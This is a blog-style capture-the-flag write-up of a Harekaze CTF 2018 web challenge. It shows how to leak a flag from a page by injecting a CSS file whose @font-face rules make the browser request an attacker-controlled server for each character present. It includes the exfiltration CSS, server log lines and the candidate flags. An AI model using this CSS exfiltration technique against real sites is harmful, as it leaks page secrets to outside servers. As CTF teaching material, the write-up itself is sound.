---
layout: post
title:  "Harekaze CTF 2018 - A custom CSS for the flag"
date:   2018-02-11 22:00
categories: [HarekazeCTF2018]
tags: [Web]
author: jbz
---

Let’s decorate with fashionable CSS in this [site](http://problem.harekaze.com:10003/).

It's a 250 points **web** challenge.
Let's start, this is the home page:

![HomePage](https://raw.githubusercontent.com/jbzteam/CTF/master/HarekazeCTF2018/homepage.png)

As you can see there are some explanations and the source code of the application in the **server.js** [file](https://github.com/jbzteam/CTF/blob/master/HarekazeCTF2018/server.js).  

Thanks to the code we know that it's a node.js server, that has two distinct applications using the express framework. The first application (app) uses Chromium to visit the page served by the second application (app2). 

This page is simple, it has a div with `id=flag` containing the flag and a link pointing to an external css file. This css file is provided by us through the form in the main page.

This is the snippet showing the page structure.
```javascript
    res.send(`<html>
    <link rel="stylesheet" href="${encodeURI(req.query.css)}" />
    <body>
        <div id="flag">
                HarekazeCTF{${fs.readFileSync("flag.txt")}}
        </div>
    </body>
    </html>`);
```

The only part of the page controlled by us is the CSS file, so we need a method to exfiltrate data with CSS.  
Is it possible? YES!

Googling around in order to find a way to exfiltrate data we found a CSS file that uses the @font-face css properties in an interesting way.

For each letter it defines an external font url:
```css
@font-face{
    font-family:'Capital-A';
    src:url('http://ipserver/?Found:A');
    unicode-range:U+0041;
}
@font-face{
    font-family:'Capital-B';
    src:url('http://ipserver/?Found:B');
    unicode-range:U+0042;
}
@font-face{
    font-family:'Capital-C';
    src:url('http://ipserver/?Found:C');
    unicode-range:U+0043;
}
```
... and so on.  
We have to edit this file in order to include the symbols `{}-_` according to the information provided by the chall:  
_"The flag format is the two CSS3 properties connected by a underscore (_).

Example: HarekazeCTF{background-image_font-size}"_

Now the most important part about our CSS file is:
```css
#flag{
    font-family:'Capital-A','Capital-B','Capital-C' ... 
}
```

What the does CSS file do?  
It defines an external font for each letter or symbol, and when the letter is present in the div having `id=flag`, it loads that external font.  
Providing an URL for the font controlled by us we can see which letters compose the flag.

Keep in mind that we can only check whether a letter exists and not the amount of occurrncies.  
Next step is to upload the CSS file on a server managed by us, and to provide the URL to the page in order to have Chromium visiting it.  
Let's take a look at the log files to see which letters and symbols were found.
```
163.43.29.129 - - [10/Feb/2018:21:17:16 +0100] "GET /?Found:F HTTP/1.1" 200 466 "http://x.x.x.x/ctf.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/64.0.3282.119 Safari/537.36"
163.43.29.129 - - [10/Feb/2018:21:17:16 +0100] "GET /?Found:C HTTP/1.1" 200 466 "http://x.x.x.x/ctf.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/64.0.3282.119 Safari/537.36"
163.43.29.129 - - [10/Feb/2018:21:17:16 +0100] "GET /?Found:H HTTP/1.1" 200 466 "http://x.x.x.x/ctf.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/64.0.3282.119 Safari/537.36"
163.43.29.129 - - [10/Feb/2018:21:17:16 +0100] "GET /?Found:d HTTP/1.1" 200 465 "http://x.x.x.x/ctf.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/64.0.3282.119 Safari/537.36"
...
```
Parsing the log, this is the list:
```
Found:F 
Found:C 
Found:H 
Found:d 
Found:e 
Found:k 
Found:T 
Found:b 
Found:a 
Found:o 
Found:z 
Found:{ 
Found:m 
Found:t 
Found:- 
Found:f
Found:r 
Found:l 
Found:i 
Found:n 
Found:s 
Found:u 
Found:_ 
Found:c 
Found:} 
```

How to find the 2 css properties with these letters? Let's check the CSS properties one by one to see which ones have the corrisponding letters.  

Could we use Python, C, or GO? Yes, but we prefer the quick and dirty `grep` and `awk`!

```bash
| grep -v $'g|h|j|p|q|w|x|y' | awk '/d/ && /b/ && /o/ && /m/ && /t/ && /f/ && /l/ && /i/ && /n/ && /s/ && /u/ {print;}'
```
So we are given a list of some possible flags:
```
HarekazeCTF{animation-direction_border-bottom-left-radius}
HarekazeCTF{animation-iteration-count_border-bottom-left-radius}
HarekazeCTF{border-bottom-color_outline-offset}
HarekazeCTF{border-bottom-left-radius_animation-direction}
HarekazeCTF{border-bottom-left-radius_animation-iteration-count}
HarekazeCTF{border-bottom-left-radius_column-count}
HarekazeCTF{border-bottom-left-radius_column-fill}
HarekazeCTF{border-bottom-left-radius_column-rule}
HarekazeCTF{border-bottom-left-radius_column-rule-color}
HarekazeCTF{border-bottom-left-radius_columns}
HarekazeCTF{border-bottom-left-radius_content}
HarekazeCTF{border-bottom-left-radius_counter-increment}
HarekazeCTF{border-bottom-left-radius_counter-reset}
HarekazeCTF{border-bottom-left-radius_direction}
HarekazeCTF{border-bottom-left-radius_outline-color}
HarekazeCTF{border-bottom-left-radius_unicode-bidi}
HarekazeCTF{column-count_border-bottom-left-radius}
HarekazeCTF{column-fill_border-bottom-left-radius}
HarekazeCTF{column-rule_border-bottom-left-radius}
HarekazeCTF{column-rule-color_border-bottom-left-radius}
HarekazeCTF{columns_border-bottom-left-radius}
HarekazeCTF{content_border-bottom-left-radius}
HarekazeCTF{counter-increment_border-bottom-left-radius}
HarekazeCTF{counter-reset_border-bottom-left-radius}
HarekazeCTF{direction_border-bottom-left-radius}
HarekazeCTF{outline-color_border-bottom-left-radius}
HarekazeCTF{outline-offset_border-bottom-color}
HarekazeCTF{unicode-bidi_border-bottom-left-radius}
```
We had to try it one by one, but we followed our heart and, since one of us said that the flag should've started with `border-bottom`, we got really lucky and found it on the 5th attempt:
```
HarekazeCTF{border-bottom-left-radius_animation-direction}
```

Bonus: [a python script](https://github.com/jbzteam/CTF/blob/master/HarekazeCTF2018/css.py) to get the possible flag instead of dirty grep hacks
